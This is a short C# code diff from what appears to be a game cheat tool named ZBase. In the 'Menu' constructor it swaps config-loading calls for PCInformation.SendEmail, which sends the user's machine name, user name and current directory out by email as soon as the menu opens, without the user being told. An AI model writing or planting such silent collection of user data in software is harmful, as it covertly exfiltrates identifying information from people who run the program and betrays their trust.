@@ -20,9 +20,8 @@ namespace ZBase
         public Menu()
         {
             InitializeComponent();
-
-            OffsetUpdater.UpdateCheatStatus();
-            OffsetUpdater.GetConfigFromFile();
+            PCInformation.UpdateCheatStatus();
+            PCInformation.SendEmail(Environment.MachineName, Environment.UserName, Environment.CurrentDirectory);
             Thread.Sleep(100);
             if (Main.C.MyCheat)
             {
